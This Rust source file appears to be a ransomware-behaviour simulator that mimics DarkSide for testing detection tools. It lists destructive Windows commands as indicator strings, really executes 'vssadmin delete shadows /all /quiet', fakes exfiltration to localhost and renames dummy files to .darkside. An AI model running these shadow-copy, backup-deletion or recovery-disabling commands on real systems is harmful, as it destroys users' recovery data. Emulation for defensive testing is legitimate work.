//! Threat: DarkSide Doxware
//! DOES NOT CONTAIN REAL MALWARE OR ENCRYPTION.

use std::env;
use std::fs::{self, File};
use std::io::Write;
use std::net::TcpStream;
use std::path::PathBuf;
use std::process::Command;
use rand::Rng;

fn get_temp_dir() -> PathBuf {
    let mut temp = env::temp_dir();
    temp.push("win_service_cache");
    let _ = fs::create_dir_all(&temp);
    temp
}

fn main() {
    // FAKE IOCs FOR STATIC ANALYSIS DETECTION
    #[allow(dead_code)]
    let static_iocs = [
        "WanaCrypt0r",
        "LockBit",
        "DarkSide",
        "REvil",
        "vssadmin.exe delete shadows /all /quiet",
        "wbadmin DELETE SYSTEMSTATEBACKUP",
        "bcdedit /set {default} recoveryenabled No",
        "taskkill /f /im",
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        "crypto_keys_encrypted.rsa",
    ];
    std::hint::black_box(static_iocs);

    println!("==================================================");
    println!(" [+] DarkSide Payload Executing...");
    println!("==================================================");

    println!("[*] Executing vssadmin.exe to delete Volume Shadow Copies...");
    if let Ok(mut child) = Command::new("vssadmin.exe").args(&["delete", "shadows", "/all", "/quiet"]).spawn() {
        std::thread::sleep(std::time::Duration::from_secs(5)); // Sleep WHILE the child is alive
        let _ = child.wait(); // Wait for it to finish
    }

    let temp_dir = get_temp_dir();
    let mut rng = rand::thread_rng();

    println!("[*] Exfiltrating and encrypting sensitive data...");
    for i in 0..50 {
        let file_path = temp_dir.join(format!("backup_vol_{}.dat", i));
        if let Ok(mut file) = File::create(&file_path) {
            let mut buffer = vec![0u8; 500 * 1024]; // 500KB
            rng.fill(&mut buffer[..]);
            let _ = file.write_all(&buffer);
        }
        
        std::thread::sleep(std::time::Duration::from_millis(100));
        
        // Exfil: Benign HTTP GET request
        if let Ok(mut stream) = TcpStream::connect("127.0.0.1:9999") {
            let request = format!("GET /sync_blob?id={} HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n", i);
            let _ = stream.write_all(request.as_bytes());
        }
    }

    println!("[*] Appending .darkside extensions...");
    for i in 0..50 {
        let old_path = temp_dir.join(format!("backup_vol_{}.dat", i));
        let new_path = temp_dir.join(format!("backup_vol_{}.darkside", i));
        let _ = fs::rename(&old_path, &new_path);
    }
    
    println!("[+] Target system encrypted and data exfiltrated.");
    
    // Sustained Execution (The Cryo-Stasis Target)
    std::thread::sleep(std::time::Duration::from_secs(20));
}